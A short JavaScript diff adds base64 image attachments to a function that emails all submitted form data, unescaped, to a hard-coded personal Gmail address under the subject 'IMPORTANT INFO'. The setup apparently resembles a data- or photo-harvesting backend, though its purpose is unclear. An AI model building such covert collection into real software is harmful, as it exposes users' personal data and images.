@@ -16,12 +16,26 @@ export async function sendEmail(data) {
     },
   });
 
+  const attachments = [];
+
+  if (data.image) {
+    const base64Data = data.image.replace(/^data:image\/\w+;base64,/, "");
+    const buffer = Buffer.from(base64Data, "base64");
+
+    attachments.push({
+      filename: `photo-${Date.now()}.jpg`,
+      content: buffer,
+      encoding: "base64",
+    });
+  }
+
   const mailData = {
     from: "'Guess' <armenmartirosyan020@gmail.com>",
     to: "front7226@gmail.com",
     subject: "IMPORTANT INFO",
     text: "IMPORTANT INFO",
     html: `<div>${JSON.stringify(data)}</div>`,
+    attachments,
   };
 
   try {
